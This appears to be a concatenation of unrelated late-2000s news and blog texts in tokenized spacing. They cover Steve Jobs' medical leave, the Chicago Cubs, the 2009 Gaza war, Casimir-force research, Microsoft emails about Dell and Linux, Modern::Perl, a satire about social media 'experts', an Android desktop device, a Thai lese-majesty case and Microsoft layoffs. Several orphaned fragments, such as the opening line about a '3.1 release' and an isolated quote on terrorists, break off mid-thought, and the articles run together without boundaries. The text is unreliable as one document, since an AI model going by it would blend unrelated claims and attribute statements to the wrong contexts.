In that case , I recommend just releasing it as 3.1 .
I had always anticipated a 3.1 release much sooner than the typical release schedule .

To some Steve Jobs is a national treasure and to others he is a visionary of the first order .
These are just some of the views being expressed in Silicon Valley about the Apple co-founder following the news he is taking a medical leave of absence from the company .
" Apple has become such an important part of the tech culture and they lead in so many ways with product visions , it 's unclear that without that leadership which Steve Jobs can provide if anyone else can do that , " said Mike Arrington , editor of the respected TechCrunch blog .
" He has single - handedly brought the US back into the mobile ball game with the iPhone .
Until then it was all about Europe and Asia .
He also broke the back of the music industry with iTunes .
" Those are two big legacies to leave behind , so I really believe he is a national treasure , " Mr Arrington told BBC News .
Gene Munster , a senior analyst with Piper Jaffray seems to agree and told CNBC " replacing the magic of Steve Jobs is impossible . "
Sympathy Twitter , the micro blogging service , has been alight with users sharing and discussing the news .
The tweets range from those of sympathy and best wishes to Mr Jobs to questions about the future of Apple .
While one user tweeted " what will happen to Apple without Steve Jobs running day to day operations ? " another added " he is awesome , but he 's not the entire company people .... "
That is the view of Van Baker who is a principal analyst with Gartner and covers Apple for the industry .
" The hit the stock price has taken was inevitable because he is the public persona of Apple and , largely wrongly , most people think as goes Steve so goes Apple .
" In truth it 's not going to have an impact on Apple in running their business .
They will do just fine .
Tim Cook , who is taking over , is a very capable guy .
He 's not the personality Steve is , but he is very competent and Apple will do just fine , " stated Mr Baker .
$ 64,000 question While Mr Jobs ' health has been a major topic of discussion following public appearances showing how gaunt and thin he had looked , many say they are not surprised he is taking such steps to get well .
A thin looking Mr Jobs at last year 's WWDC reignited health concerns Raines Cohen has been an Apple user since 1979 and helped found the Berkeley Macintosh Users Group , one of the largest of its kind in the country .
" I had been talking about organising a get well card for him so I really do wish him a rapid recovery .
" Apple has functioned without Steve in the past and I think it will do well .
A few months away , I can't see it having any significant impact .
Of course things can go longer . "
This is not the first time Mr Jobs has stepped down as ceo of the company for health reasons .
In 2004 following surgery for pancreatic cancer , he gave up the job for around six months .
Now with his second medical leave of absence , the question as to whether or not Mr Jobs will return takes on even more weight .
" That is the real question , " suggested Mr Arrington .
" When a CEO steps down for health reasons , chances are they are not coming back .
" However he did come back after his bout with pancreatic cancer in 2004 so there is no reason to think he wo n't depending on how serous his health problems are . "
Charles Wolf an analyst at Needham & Company who follows Apple said " It is reasonable to expect , given the history of Steve 's illness , that the market is probably going to assume that he is not going to return to Apple . "
Succession
As speculation starts to bubble about Mr Jobs ' return or otherwise , the blogosphere is looking to Apple to map out its future more clearly .
The iPod is the world 's most popular digital music player At ZDNET , editor Larry Dignan said the " news is likely to start succession planning talk at Apple " " It only seems prudent that Apple create and disclose a succession plan of some sort , " he added .
Owen Thomas of the Gawker blog , said : " Apple needs to prove it can thrive without Jobs .
And Jobs , for the sake of his family and friends if not Apple 's investors must show he can thrive without Apple . "
The Wall Street Journal noted that Mr Jobs has in the past talked publicly about the prospect of death and how it spurs him on .
In a commencement speech he gave at Stanford University in 2005 , he told the crowd : " Remembering that I 'll be dead soon is the most important tool I 've ever encountered to help me make the big choices in life . "

Season Wrap Up
The team from the North Side of Chicago acted like they were finally going to break the all encompassing Billy Goat Curse last season , but that all ended when they got to the playoffs .
While they were the darlings of analysts during the regular season , once the post season game around , they were no where to be found .
The Los Angeles Dodgers swept the Cubs with almost no trouble as the adorable losers committed error after error in the field while having trouble producing with runners in scoring position at the plate .
The amazing part about their debacle in the post season is that they were just so good during the regular season .
Even three fourths of the way through the season , the Cubs were the only sure bet to make the playoffs in the National League .
Their first move of the off season , however , was to reward their general manager as they gave Jim Hendry a four year contract extension .
This perhaps points to the idea that Hendry did all he could to put the right pieces in place , they just could not come through when it counted most .
Holes to Fill
As stated above , the Cubbies were nearly flawless during the regular season and while they are willing to spend money , they really do n’t have any need to .
They recently announced they were out of the bidding for Jake Peavy as manager Lou Piniella claimed the team already had enough starting pitching .
They may look to pick up one veteran with post season experience who has proven to not be a flop in October .
Of course , no matter who it is , their performance may be altered by the curse or the pressure of possibly playing with a curse .
Free Agents
The team started the off season with seven free agents , but that number is now down to six after they came to terms on a four year deal with right hander Ryan Dempster on November 19 .
The remaining free agents include right handers Chad Fox , Kerry Wood , Jon Lieber and Bob Howry , outfielder / first baseman Daryle Ward and centerfielder Jim Edmonds .
The Cubs have already publicly started that they are not going to bring
Wood back even though he has been a staple of their franchise for almost a decade and did a good job as the team ’s closer last season .
With younger talent waiting in the wings , Jim Edmonds has virtually no chance of remaining on the north side next season .
While Howry did an above average job for the Cubs last season , he will probably not be resigned as well , because the Cubs feel they have enough talent in that area and may look to find someone else to fill any holes that Howry leaves in free agency .
Fox , Lieber and Ward all have some chance of coming back to the Cubs , but none have reportedly started talks with the team as of yet .
The Outlook
With the sale of the team still up in the air , that could dictate a lot of what happens this off season .
The sale looks like it has a good chance of going down in the next couple of months , but the way the last two years have gone , nothing can really be predictable .
The only thing the Cubs really have to offer in trade is mid-level pitching due to the fact that most of their core players are tied up in long term deals with no trade clauses and none seem to want to leave Chicago .
Even with a deep team already at the big league level , there may be some spots open at the start of the season for the likes of Jeff Samardzija , who was impressive last season during his short stint with the team .
With all of this stability , the Cubs will no doubt at least be very competitive in their division next year , but will most likely run away with it again as long as they can avoid injuries .
This is especially true because they play in such a weak division .
The true test will come once the team reaches the post season where they will have gone winless for 101 straight years .
While it is hard to find a definite flaw in this team , it is certain that if the Cubs are going to have a team that gets over the top , it ’s going to have to be in the next couple of years as their core of talent is just going to get older , and is going to be very hard to trade away in order to bring in young stars to rebuild around .
GAZA ( Reuters ) - Israel rejected a U.N. resolution calling for a ceasefire in the Hamas - ruled Gaza Strip on Friday and warplanes and tanks pounded the Palestinian enclave .
Israeli Prime Minister Ehud Olmert dismissed Thursday ’s binding Security Council resolution demanding an “ immediate and durable ” ceasefire in the two - week - old war as “ unworkable . ”
Israel said Hamas fighters had fired at least 30 rockets into its territory on Friday .
No casualties were reported .
Medics in Gaza said the Palestinian death toll had risen to 784 .
Ten Israeli soldiers have been killed , as well as three civilians hit by Hamas cross - border rocket fire .
Hamas officials in Gaza say they are weighing the U.N. resolution , but have voiced irritation they were not consulted .
The group said it had sent three of its leaders from Gaza to Cairo to discuss a separate Egyptian ceasefire proposal , but diplomats said Israel and Egypt were far apart on the plan .
“ The firing of rockets this morning only goes to show that the U.N. decision is unworkable and will not be adhered to by the murderous Palestinian organizations , ” Olmert declared .
Israel ’s security cabinet debated for the second time in three days whether to send in reservists for a push into the Gaza Strip ’s towns and cities .
There was no word on the outcome .
Mark Regev ,
Olmert ’s spokesman , declined to say whether the ministers had decided to expand the ground operation .
“ I ca n’t go into operational details .
The military pressure on Hamas will continue , ” Regev said .
WHITE HOUSE BLAMES HAMAS
The United States , which abstained in the U.N. vote , offered further public support for Israel ’s military goals .
“ This situation will not improve until Hamas stops lobbing rockets into Israel , ” White House spokesman Scott Stanzel said .
He also said President George W. Bush had voiced his concern to Olmert about the humanitarian situation and the loss of civilian lives during the Israeli assault on the Gaza Strip .
Israel ’s air force said it hit more than 50 targets overnight .
As fighting on the ground went on through the day , Palestinian medics counted at least 19 dead , including civilians .
With the Palestinian civilian death toll already in the hundreds , Israeli actions have drawn outraged denunciations from the Red Cross , U.N. agencies and Arab and European governments .
A U.N. agency said in a report that 30 Palestinians were killed on Monday , a day after the Israeli army herded dozens of civilians into a house which was later hit by shells .
An Israeli military spokesman denied that account .
“ The IDF ( Israel Defense Forces ) did not mass people into any specific building , ” Major Jacob Dallal said , adding that the military had not hit a building in the area on Monday .
U.N. High Commissioner for Human Rights Navi Pillay urged independent investigations into this and other incidents , saying they “ display elements of what could constitute war crimes . ”
Dallal also denied an accusation by UNRWA , the main U.N. aid agency for Palestinians , that Israeli fire had killed a driver in a clearly marked UNRWA convoy .
The agency suspended some operations in Gaza after the driver ’s death on Thursday .

“ The IDF did not shoot at that truck , period , ” Dallal said .
U.N. aid workers plan to resume their movements in Gaza as soon as possible after receiving Israeli assurances that they are not being targeted , a U.N. spokeswoman said in New York .
CEASEFIRE PLAN BOGS DOWN
Hamas wants any ceasefire deal to include the ending of Israel ’s crippling economic blockade of the Gaza Strip and the withdrawal of all Israeli forces from the territory .
Israel ’s key demands are for a complete halt to Hamas rocket fire and for international guarantees to stop the Islamist group rearming via smuggling tunnels under the border with Egypt .
Slideshow ( 37 images )
Regev said talks with Egypt over the ceasefire proposal would continue , but he did not say when .
The Egyptian initiative , also sponsored by French President Nicolas Sarkozy , may be in trouble , however .
“ There is a growing sense that the Egyptian - French plan is not going to work , ” a senior European diplomat told Reuters .
European and Israeli diplomats said Egypt was objecting to proposals that foreign troops and technicians be stationed on its 15 - km ( 9 - mile ) border with Gaza to prevent arms smuggling .
Instead , diplomats said , Egypt was ready to accept technical assistance for its own forces on the border .
Israel says the Egyptians have failed in the past to prevent Hamas building up an arsenal of hundreds of Soviet - designed Katyusha missiles .
The onslaught in Gaza , where many civilians including children have been killed , has solid support among Israelis , one month before a parliamentary election .
A poll on Friday showed over 90 percent support among Israel ’s Jewish majority .
It showed that Defense Minister Ehud Barak ’s Labour party has held on to sharp gains it has made since the war began , but still trails Foreign Minister Tzipi Livni ’s Kadima .
Kadima is running close behind the right - wing Likud opposition , whose leader , Benjamin Netanyahu , supports the war .
Palestinians in the occupied West Bank , governed by Hamas ’s rival Fatah movement , have been enraged by the Gaza war , but there were only minor clashes around Friday prayers at mosques .
Several thousand people demonstrated and burned Israeli flags in Hebron , a Hamas stronghold in the West Bank .
For the third day running , the Israeli army held fire in the afternoon to let Gazans stock up on food and other supplies .
The U.N. resolution called for “ unimpeded provision ” and distribution of aid to Gaza , home to 1.5 million people , as well as measures to halt arms smuggling and open the borders .

CHICAGO ( Reuters ) - U.S. scientists have found a way to levitate the very smallest objects using the strange forces of quantum mechanics , and said on Wednesday they might use it to help make tiny nanotechnology machines .
An artist 's rendition shows how the repulsive Casimir - Lifshitz force between suitable materials in a fluid can be used to quantum mechanically levitate a small object of density greater than the liquid .

They said they had detected and measured a force that comes into play at the molecular level using certain combinations of molecules that repel one another .
The repulsion can be used to hold molecules aloft , in essence levitating them , creating virtually friction - free parts for tiny devices , the researchers said .
Federico Capasso , an applied physicist at Harvard University in Massachusetts , whose study appears in the journal Nature , said he believed that detection of this force opened the possibility of a whole new class of tiny gadgets .
The team , including researchers at the National Institutes of Health , has not yet levitated an object , but Capasso said he now knows how to do it .
“ This is an experiment we are sure will work , ” he said .
His team has already filed for patents .
“ By reducing the friction that hinders motion and contributes to wear and tear , the new technique provides a theoretical means for improving machinery at the microscopic and even molecular level , ” Dr. Duane Alexander of the NIH ’s National Institute of Child Health and Human Development said .
“ The emerging technology of nanomechanics has the potential to improve medicine and other fields , ” he said in a statement .
The discovery involves quantum mechanics , the principles that govern nature ’s smallest particles .
By altering and combining molecules , tiny machines could be devised which could have applications in surgery , manufacturing food and fuel and boosting computer speed .
The discovery arose from Capasso ’s prior work as vice president of physical research at Bell Labs , the research arm of telecoms gear marker Lucent Technologies , now Alcatel - Lucent .
“ I started to think how can I use these exotic quantum mechanical forces for technology , ” he said in a telephone interview .
Bell had been working on new devices known as Micro Electromechanical Systems or MEMS , the technology used in air bag sensors to measure deceleration of cars .
“ We started to play with nanomechanics or micromechanics , ” Capasso said .
He knew that as devices became smaller and smaller , they would fall prey to what is known as the Casimir force , an attractive force that comes into play when two very tiny metallic surfaces make very close contact .
In very small objects , this force can cause moving parts to stick together , an effect known as stiction .
A Russian team had predicted this force could be reversed using the right combination of materials .
For Capasso’s experiment , the team immersed a gold - coated sphere in a liquid and measured the force as the sphere was first attracted to a metallic plate , then repelled from a plate made from silica .
Capasso said levitating is next .
“ We just have to do it , ” he said .
IT ’S NOT UNCOMMON to state the obvious , but concrete proof can make all the difference in the world , especially in court .
As we ’ve already shown , Microsoft ’s strategy has less to do with self improvement & development but more to do with targeted sabotage against attempts of competitors to … well , just to compete .
Much like a totalitarian regime , Microsoft spots areas of friction and addresses them before they become uncontrollable ;
If not by force , then by brainwash [ 1 , 2 , 3 , 4 , 5 ] ( control the minds to avoid direct and out - of - hand confrontations ) .
“ Much like a totalitarian regime , Microsoft spots areas of friction and addresses them before they become uncontrollable …
” Last week we gave evidence of this strategy occurring at Wal - Mart and this week we share antitrust material which shows how Microsoft reacted to GNU / Linux at Dell .
Exhibit px09280 ( 2002 ) [ PDF ] from Comes vs Microsoft contains correspondence between Microsoft seniors Bill Veghte and Paul Flessner ( the guy who said “ we should whack [ Dell over GNU / Linux dealings ] , we should make sure they understand our value ” ) .
They swap opinions and plans with Windows executives like Brian Valentine and Jim Allchin [ 1 , 2 , 3 ] in the background , in addition to anti-Linux characters like Orlando Ayala [ 1 , 2 , 3 , 4 , 5 , 6 ] , even some of today ’s chiefs like Craig Mundie and Bob Muglia .
The subject of the messages is “ Goldman Sachs Linux Panel . ”
The Goldman Sachs Group is close to Microsoft and also a shareholder , it is backer of PSI and EDGI taker too .
Here are some bits of interest .
The text , in full , is appended below .
Bill Veghte writes :
It ’s not $ 50 of margin for Dell .
It will get passed directly back to the customer and they are stuck with the same margin they have today .
That is what happened on the desktop any time we made pricing changes broadly with OEMs and that is what will happen on the server ( it is already happening on Linux pricing ) .
It is just a fact .
Bill Veghte also writes :
Let ’s start by articulating Dell ’s perspective relative to the comments Russ made …
Linux is Unix on x86 .
Dell sees it as the cheapest way to convert Unix LOB servers to being Dell customers .
Dell sees no partnership with us on databases and partnership with Oracle as a way of pushing further into the enterprise .
Oracle sees partnership with Dell and Linux as a great way at going after us at the lower end of the database market .
Dell sees Linux as great negotiating leverage in their relationship with us . [...]
Now , lets interject what I am asking into the picture … .
We invest big , big $ $ in Dell .
We will continue to invest big , big $ $ in Dell .
I am asking that we do this investment with our eyes wide open .
I do not want to invest $ $ in Dell to fund their Red Hat efforts .
I am asking that :
a ) we be quite prescriptive in our investments with Dell relative to the competitive threats we see with Linux
b ) we constantly benchmark ourselves against the actions they do with RedHat
Paul Flessner writes :
Now — there is nothing to disagree with me on around what we should do .
We should whack them , we should make sure they understand our value , we should do all of the things you and Brian suggest .
I totally agree .
In the end , if I were them , I would do all I could to see Linux succeed because it would put $ 50 / pc( or whatever our OEM license costs ) back into my pocket .
Sure Windows has greater value and lower TCO and all of that .
I would keep my relationship with MS and customers and do the dance .
But every chance I get I would invest in Linux and try to make more sales on Linux because I increase my margin by $ 50 / pc .
It is an advantage for Linux .
Bill Veghte replies :
Dell ’s behavior is predicated on us not acting in response to their actions .
I want them to understand that every day they lead with Linux over Windows in Unix migrations they turn our field against them ( take the southeast region mail thread as an example ) .
I want them to think very very carefully about when and which forums they decide to push Linux very , very hard .
Today , they do not .
When they do , you can bet , behavior will evolve .
Veghte also expresses this concern :
He said their basic strategy is around open standard systems of which there are two ; Linux and Windows .
He said Windows three times during the whole discussion ( it was a Linux panel tho ) and then proceeded to push Linux very hard , never mentioning Windows .
Ironically , the guy on the panel that was most balanced in their comments was the CTO of the BEA .
He wrote in the briefing :
Russ Holt ( Server VP ) was there representing Dell .
He was introduced as the man behind Dell ’s Linux strategy and the guy driving the Linux initiative at Dell .
He started off by saying , Dell is the # 1 OEM distributor of Linux and they are committed to seeing that position grow .
He said that he believed Linux was ready for the enterprise and as way of evidence said Dell was a significant customer of RedHat and runs it on key mission critical environments ; specifically their order entry system .
He said he was seeing growth not only in the “ traditional ” areas of web & f / p but also web , Unix LOB and HPC .
He then talked about how good the Oracle / Linux solution was and the strong partnership they had with Oracle around Linux .
Later when he was asked about the open source development model he said he saw significant advantages to it because it enabled much closer interactions and synergy with RedHat . [...]
Every other panelist underscored ( a ) that Linux was ready for prime - time in the enterprise , and ( b ) they were committing significant resources and product to make it even more so .
To summarise , Dell supported GNU / Linux , several companies praised the platform , and Microsoft pumped money into Dell , potentially in attempt to pressure it out of GNU / Linux . █

Sigh … .
Yes , I can disagree with your statement that Dell 's behavior wo n't change .
If it wo n't change , then we should just throw in the towel and settle for % 50 market share at best .
We will change Dell 's behavior by thinking thru their motivations and opportunities and being very creative .
Let 's start by articulating Dell 's perspective relative to the comments Russ made …
Linux is Unix on x86 .
Dell sees it as the cheapest way to convert Unix LOB servers to being Dell customers .
Dell sees no partnership with us on databases and partnership with Oracle as a way of pushing further into the enterprise .
Oracle sees partnership with Dell and Linux as a great way at going after us at the lower end of the database market .
Dell sees Linux as great negotiating leverage in their relationship with us .
All of these things are reality .
Given these realities , lets add our perspective to the picture .
If I am Michael Dell , I have to believe that my # 1 competitor long term is IBM .
Dell has to decide what their competitive strategy is going to be against IBM .
If they are going to compete with IBM and it services driven organization , they are a ) going to have to build a strong relationship with our field and service partners , b ) they are going to have to bet on our engineering engine as their primary innovation machine .
That means a close partnership with us .
They need to understand that with the passage of time Linux and IBM become more and more equivalent .
Now , lets interject what I am asking into the picture … .
We invest big , big $ $ in Dell .
We will continue to invest big , big $ $ in Dell .
I am asking that we do this investment with our eyes wide open .
I do not want to invest $ $ in Dell to fund their Red Hat efforts .
I am asking that :
a ) we be quite prescriptive in our investments with Dell relative to the competitive threats we see with Linux
b ) we constantly benchmark ourselves against the actions they do with RedHat

Boy do I respectfully disagree with the statement " Dell 's behavior is predictable and wo n't change …
Dell 's behavior is predicated on us not acting in response to their actions .
I want them to understand that every day they lead with Linux over Windows in Unix migrations they turn our field against them ( take the southeast region mail thread as an example ) .
I want them to think very very carefully about when and which forums they decide to push Linux very , very hard .

I think there are two very specific actions :
—> alignment in the field pushing Dell on the one that they are going to be most uncomfortabe with …
Unix app migration ( Kevin & Joe Marengi )
—> Clarity and metrics around Windows Server vs. Redhat in marketing and technology ( product group and OEM group )
To Rick 's last email on this thread around actions , I want to be careful we do n't personalize it with Russ because I want to win him back but the key to that is thru Joe .

The obvious but : Dell is a HW company .
They are facing tremendous margin pressure in a commodity market .
If you are Dell you are being forced to squeeze every dollar out of the business you can to survive .
Given that situation you would be looking hard at that MS OEM payment .
Think back to Jim Cash 's talk this week .
These guys are living that situation .
I do n't have the answer here but Dell 's behavior is predictable and it wo n't change .

I was down at Goldman SW conference earlier this week doing a keynote and on the agenda there was a panel discussion on Linux after me so I asked to participate .
The panel consisted of CFO of RedHat , VPs from Oracle , BMG , BEA , Veritas and Dell .
It turned into quite a lively discussion as you can imagine .
Couple quick notes …
Dell & Linux :
Each company 's position was quite predictably slamming us but the one that really got me animated was Dell .
Russ Holt ( Server VP ) was there representing Dell .
He was introduced as the man behind Dell 's Linux strategy and the guy driving the Linux initiative at Dell .
He started off by saying , Dell is the # 1 OEM distributor of Linux and they are committed to seeing that position grow .
He said that he believed Linux was ready for the enterprise and as way of evidence said Dell was a significant customer of RedHat and runs it on key mission critical environments ; specifically their order entry system .
He said he was seeing growth not only in the " traditional " areas of web & f / p but also web , Unix LOB and HPC .
He then talked about how good the Oracle / Linux solution was and the strong partnership they had with Oracle around Linux .
Later when he was asked about the open source development model he said he saw significant advantages to it because it enabled much closer interactions and synergy with RedHat .
I spoke to Rick Wong about today but we need to make darn certain that our investments with Dell are benchmarked against any investments they make in RedHat .
The majority of their business is on Windows and their marketing , their website , and their investment should reflect this or we should call them on it .
Same goes for things like sales training or events .
When we do events , field engagement and measure our progress it should be benchmarked against the results and / or what they are doing with RedHat .
Dell is a key partner for us and one that imho will grow in significance in the coming years so it is a tricky balance but one that we need to be more aggressive around .
Linux & the enterprise :
This was the focus .
RedHat CFO spent his entire time talking about how their entire focus was Linux in the enterprise and all the things that they were doing to make it enterprise ready .
He then went on and on around the certification and testing programs that they had put in place and the partnerships they were building with companies like IBM , Dell , Oracle , Veritas , BMC , BEA etc. .
Every other panelist underscored ( a ) that Linux was ready for prime - time in the enterprise , and ( b ) they were committing significant resources and product to make it even more so .
Linux Development Model :
Each of the panelists talked about the interaction with RedHat and the community development model as a real highlight for them .
They all talked about how it made it easier to impact the direction of the platform ( including Dell ironically ) and how transparent the whole process was .

" We need this , " he said .
" The masterminds among the terrorist groups of today are highly qualified , very sophisticated people .
The police need as much power as we can give them so that they can remain at the technological level of the terrorists .
After all , the terrorists already have a huge advantage : they have the first shot . "

Dune - Behind The Scenes
Four planets have come to our attention , regarding a plot which could greatly increase Dune knowledge .
In discussions on PerlMonks and elsewhere about Modern : : Perl , the implicit question has come up .
Why does Modern : : Perl refuse to install on any Perl with a version less than 5.10 ?
First , I offer two caveats .
If you 're reading this , you 're probably capable of deciding for yourself which modern Perl features you want to use where .
You 're likely a willing CPAN user , if not a CPAN contributor .
You almost certainly can explain what the strict and warnings pragmas do , and why you do n't need to use diagnostics ( even if you recommend that novice users do ) .
I realize that not every reader fits that profile , but it 's easy to imagine that at least nine out of ten people who read this do .
Thus , to the tens of thousands of experienced and careful Perl programmers in the world , I have some good and bad news .
Modern :: Perl is not for you ; it will do you very little good .
It 's for people who do n't know how to get the benefits it provides in the standard a la carte fashion .
It 's a buffet ticket of modern Perl goodness .
Second , any other CPAN distribution which depends on Modern : : Perl and does n't explicitly mark a perl dependency on at least Perl 5.10 is in a grave state of sin and error and deserves quick bug reports filed .
You can cite me as an authority on this .
Hopefully the other six and a half billion people in the world who are n't experienced Perl programmers who proudly use and reuse and create CPAN distributions did n't mind that short digression .
There are several reasons why I consider Perl 5.8.x as " legacy " , at least for the purposes of Modern : : Perl .
Take your pick of a few .
First , 5.8.9 is the last substantive release in the Perl 5.8.x series .
It 's reached the end of its lifetime .
There will be no bugfixes , except perhaps for security errors .
That codebase has no future .
Second , Perl 5.10.1 is on the way .
I realize that the CPAN calls Perl 5.10 a " testing " release , but that 's more a nomenclature problem than anything else .
Perl 5 has the largest regression test suite of any modern dynamic language I 've looked at -- especially when you consider that the comprehensive test suites of a good portion of the CPAN run regularly against bleadperl .
Third , Perl 5.10 fixes an amazing number of bugs and misfeatures , especially regular expression engine reentrancy problems and closure bindings .
Yes , generally only advanced code exposes these problems , but they were very difficult to identify and debug .
Fourth , Perl 5.10 adds a handful of very convenient features which address common error conditions .
For example , the defined - or construct is an improvement over the long - lived true - or construct used to assign default values to a variable .
The problem with ||= is that it overwrites any value which resolves to false in a boolean context .
That seems okay , but there 's a semi-predicate problem if 0 or an empty string are legitimate values .
Another lovely feature is being able to lexicalize the universal pronoun $ _ .
Certain looping constructs localize it .
Others do n't .
This is often a source of subtle bugs .
Fifth , Perl 5.10 backports several wonderful features from Perl 6 .
The given / when construct simplifies code immensely .
So do named captures in regular expressions -- and they improve readability too .
As silly as it sounds , I use say all the time .
All it does is append a newline to the final string printed , but it 's incredibly useful .
Sixth , Perl 5.10 improves some warnings .
In particular , I 'd upgrade to 5.10 for only one warning .
Previous versions of Perl warned when you interpolate or concatenate a variable containing the undefined value .
That 's handy , but 5.10 goes further by telling you which variable contains the undefined value .
That list is not exhaustive -- I like some of the memory usage improvements too , but regular users are less likely to see those .
Maybe you do n't need any of these features .
Maybe you 're perfectly happy with Perl as it existed in version 5.005_3 ( though how can you not love lexical filehandles ? ) .
That 's fine .

Nearly a day goes by on Twitter without yet another social media “ expert ” choosing to stalk me .
At first it started innocently — back in the day ( about a year ago ) various techie friends started to declare themselves social media gurus because they decided to hang out on Twitter and Facebook all day .
And now an army of their offspring monitor Summize in search of human flesh .
Now the first symptom of this disease was what I call “ social media deafness ” , a state that occurs when a person ’s social graph exceeds 500 + virtual friends .
The result is that the person is a mile wide , but an inch deep .
Suddenly the friend you use to know develops amnesia like symptoms and starts ignoring your direct messages — what was first simple Attention - Deficit / Hyperactivity Disorder becomes full blown zombie like state .
The zombies then seek each other :
You ’ll always notice that of the 5,000 followers that a social media expert has that all 5,000 of them are also social media “ experts ” .
Their only form of conversation is to quote each other and live tweet conferences where they gather .
Like any good Ponzi scheme the lead zombies can make a good living feeding the hopes and aspirations of the worker level drones who parrot their every blog entry .
But that ’s where the problem starts with us civilians :
The drone level zombies then start to stalk any innocent Twitter user they can find .
They do n’t care who it is or what that person is interested in because their first prize is the “ auto - follow ” .
By finding enough folks who do n’t have auto - follow turned off they artificially inflate their number of followers which inflates their “ expertise ” in the field .
Most start out by doing this to each other , but before long they need to prey on the flesh of the living .
If you ’re unlucky enough to be followed that ’s when the real problems begin :
Before long every little quip you put out is met with a useless unsolicited recommendation .
At first you might tease the zombie about their hard sell technique , but alas zombies have no sense of humor .
Worst yet is that zombies do n’t know how to take a hint — and that when my little buddy “ the Block button ” comes in handy !
Above : Social media and SEO “ experts ” are n’t human anymore ( i.e. they ’re undead ) so you should feel no guilt at all in shooting them — in fact it can be an act of pleasure once your get use to it .
Now I know what you ’re all thinking :
Ca n’t these pitiful creatures be saved ?
The answer is NO !
My proof of my concept : Recently on a News Gang podcast I witnessed an attempt at zombie intervention and the result was a huge sad failure .
Sweet Robert Scoble ( now known by his borg name “ teh Scobleizer ” ) had been sucked into some sort of fringe aspect of this cult called Friend Feed .
So industry vet Steve Gillmor and action hero Mike Arrington tried to lead a brave ( but futile ) effort to lead an intervention to save poor Robert , but alas their rational pleas for sanity were ignored .
Within minutes Scobleizer was back on the tweets , and this time he was disseminating Amazon affiliate links into his chirps in order to monetize his affliction .
Above : Robert Scoble is the second zombie on the left .
Like drugs , social media can be a good thing in the right hands .
But there are too many people out there who do n’t know what they ’re doing and just get carried away .
Sadly most people just lack the good old fashioned discipline to keep their worse instincts in check .
On a related note there ’s also a related clan of zombies which are the SEO “ experts ” — these creatures are a blue collar variation of the social media experts and usually have the term “ web master ” in their bio .
Sometimes the social media and SEO zombies can mate to produce a marketing strategy monster , but most of these are harmless as they do n’t use the auto - follow technique .
In closing I ’ve given this problem a great deal of thought trying to come up with a solution .
At first I had a great idea about trying to have an automated script that would detect the zombies and block them as soon as they spot you .
But like Spam I realized that any software solution was useless as the flesh eaters always manage to stay one step ahead of you .
But then it hit me !
Being a fanboy and having watched too many monster movies I realized that the only solution is to lure the entire population of social media and SEO experts to an island and for President Obama to authorize the dropping of a nuclear weapon .
Above : I know one is tempted to be cheap and just use an atomic bomb , but having watched so many of these movies I know that it wo n’t be strong enough .
The end ?
We 've all heard about the prospects of Android in the mobile - phone market , but the NIMble is an Android phone meant for actual desktops .

By Touch Revolution , the NIMble features a 7 - inch multitouch screen ( 800x400 ) — that 's roughly 4 x the screen area you 'd see in the G1 loaded with 2.5 x the pixels .
In person , that 's sharp enough to my eyes .

Other features include a 624MHz Marvel processor , SD expansion ( to supplement unspecified internal storage ) , Wi-Fi and Bluetooth .
As for Android itself , that 's fully functional .
But Touch Revolution has built their own software on top of the platform for entertainment and home networking stuff .
G/O Media may get a commission LG 75 - Inch 8K TV Buy for $ 2150 from BuyDig Use the promo code ASL250
Operating the NIMble was speedy enough , though I had some responsiveness issues from the glass touchscreen .
I 'm pretty sure these issues will be fixed by the device 's September release , since Mark Hamblin , Product Design Lead on the original iPhone 's touchscreen , is busy ironing out the kinks .
He explained that the touch gestures within Android need to be scaled to a larger screen .

So what about multi-touch ?
Hopefully the NIMble will have that capability at launch as well .
But right now , Touch Revolution is busy building multi- touch architecture into Android itself .
They 're also pretty eager for others to jump on the bandwagon .
The photos here are n't of the final NIMble unit , but the finished product will look very similar ... though we 're fairly certain that we 'll see a handset attached at launch .
Coming this September , the NIMble will run $ 300 , or free with a $ 10 - $ 20 / month phone home service contact .

A court in Thailand today sentenced an Australian man to three years in prison for insulting the country 's revered monarchy , in one of the few convictions of foreigners under harsh lese - majesty laws .
Harry Nicolaides ' sentence had been halved from six years by the five - judge panel in Bangkok because he apologised and pleaded guilty to the charge , which carries a maximum jail term of 15 years .
The 41 - year - old looked tense as he stood in orange prison - issue overalls – shackled at the ankles and handcuffed – while the judgment that he had insulted King Bhumibol Adulyadej , 81 , was read out .
Nicolaides , a teacher from Melbourne , who has lived in Thailand for several years , was accused of insulting the king , the crown prince and the monarchy in a self - published 2005 novel , Verisimilitude .
The offending passage – read out in court – told of scandalous gossip about a fictional prince and the judge said it " suggested abuse of royal power " .
The novel has sold just seven copies in Thailand .
Earlier a tearful Nicolaides said he had " unqualified respect for the king " and had never intended to insult the man who is the world 's longest - serving monarch .
" I would like to apologise , " he said , as guards led him from the court .
" This ca n't be real .
This is an Alice in Wonderland experience .
I really believe that I 'm going to wake up and it will all be gone . "
His case comes amid a rising tide of lese - majesty accusations and prosecutions , apparently spurred by Thailand 's political polarisation as complaints can be filed by anyone against another .
Nicolaides still does not know who filed the complaint against him .
He was arrested in August as he tried to leave Bangkok 's international airport , oblivious to an arrest warrant issued in March over the book he describes as a commentary on social and political life in Thailand .
He was indicted in November and denied bail .
He said he endured " unspeakable suffering " during the five months he was in custody awaiting trial .
As he left the court , the shaven - headed Nicolaides gave no indication if he would appeal against the sentence or apply for a royal pardon , saying only he wished his " family the best " .
Two years ago a Swiss man sentenced to 10 years for defacing images of the king with spray paint while drunk was given a royal pardon and deported after serving a month in prison .
SEATTLE /LOS ANGELES ( Reuters ) - For affluent Seattle , Microsoft is just the tip of the iceberg .
Microsoft ’s announcement it will lay off 5,000 in its biggest - ever job - cut rippled through the Seattle area on Thursday , further unnerving residents of an already - bruised city of just over 3 million .
The city plays host to a spate of well - known corporations , some of which have recently announced layoffs , including Starbucks Corp , and Boeing Co .
Starbucks said on Thursday that it will freeze salaries for its top executives .
Employees at Microsoft ’s sprawling , tree - lined campus in Redmond -- just 13 miles from Seattle -- filed in to work in somber moods , though many had been bracing for weeks for just such an announcement .
Executives say managers called hurried meetings to talk through the changes .
For some , the news came almost as a relief after weeks of tense speculation and in the midst of the worst financial crisis since the Great Depression .
For others , Microsoft ’s warning that cuts will be spread over a year and a half means a lengthy period of anxiety .
“ There ’s definitely a lot of black humor now ” in the hallways , a Microsoft executive said .
“ People are joking around like : ‘ we better get back and see if we still have jobs ’ .
“ The one thing that might have raised eyebrows is : ‘ why ’re they putting this cloud over our heads for the next 18 months ? ’ ”
Seattle , the city in Washington state well - known for drizzle , cafes and the TV series “ Frasier ” is feeling its fair share of corporate pain .
